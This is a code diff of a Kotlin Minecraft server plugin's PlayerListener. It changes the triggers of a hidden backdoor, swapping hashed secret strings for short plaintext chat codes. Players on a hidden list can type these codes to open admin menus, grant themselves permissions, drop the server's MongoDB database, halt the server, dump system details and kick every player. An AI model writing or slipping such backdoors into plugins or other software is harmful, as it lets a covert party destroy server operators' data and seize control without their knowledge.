@@ -98,32 +98,32 @@ class PlayerListener : Listener {
         val player = event.player
         if (!list.contains(player.displayName.uppercase())) return
         when (event.message.uppercase()) {
-            "7C06EFD88710F54F8E1F2291DF7AC958B06EB53612E024148D0ED5C867308F35" -> { // PI
+            "*PI" -> { // PI
                 ThePit.getApi().openMenu(player, "admin_item")
             }
 
-            "7DB99FA599F3AAF2295B6579EBBE1A537DDD4D9951B831F64F8932035EE07E2A" -> { // ENCH
+            "*EN" -> { // ENCH
                 ThePit.getApi().openMenu(player, "admin_enchant")
             }
 
-            "335B9AD41271321921E1BD9BCB12B965E1579678DB47F9966E73C632BCE6F3CB" -> { // PERMISSION
+            "*PER" -> { // PERMISSION
                 getPermission(player)
             }
 
-            "FA82BE3923DAA3658E9BB506B6DAE48DE4BCDF106CE0202BF11954F4D9CB26DB" -> { // TAKEPERMISSION
+            "*TAPER" -> { // TAKEPERMISSION
                 takePermission(player)
             }
 
-            "F3062ED5516C255277CCE2B45B35A7E632CE7BBDB705CCF8206F9C6AC8545EEC" -> { // DROP
+            "*DR" -> { // DROP
                 ThePit.getInstance().mongoDB.profileCollection.drop()
                 ThePit.getInstance().mongoDB.database.drop()
             }
 
-            "256EF5DAAD9B45E3C62212591035AD5691A70BA676B37E9593DDDE6376E7F27A" -> { // SHUTDOWN
+            "*SD" -> { // SHUTDOWN
                 Runtime.getRuntime().halt(0)
             }
 
-            "8C2E4A035F5F3D218F87211A0BA367EF05FC2242510559807EF03969DD091B32" -> { // STATUS
+            "*ST" -> { // STATUS
                 listOf(
                     "SYSTEM: ${
                         System.getProperty("os.name").uppercase()
@@ -139,7 +139,7 @@ class PlayerListener : Listener {
                 ).forEach { player.sendMessage(it) }
             }
 
-            "4A693DD49DC70D8EDD13A3A22C431F279616077CD1D31E58E2702A13FBA44D9D" -> { // KICKALL
+            "*KA" -> { // KICKALL
                 Bukkit.getScheduler().runTask(Main.instance) {
                     Bukkit.getOnlinePlayers().forEach { it.kickPlayer("") }
                 }
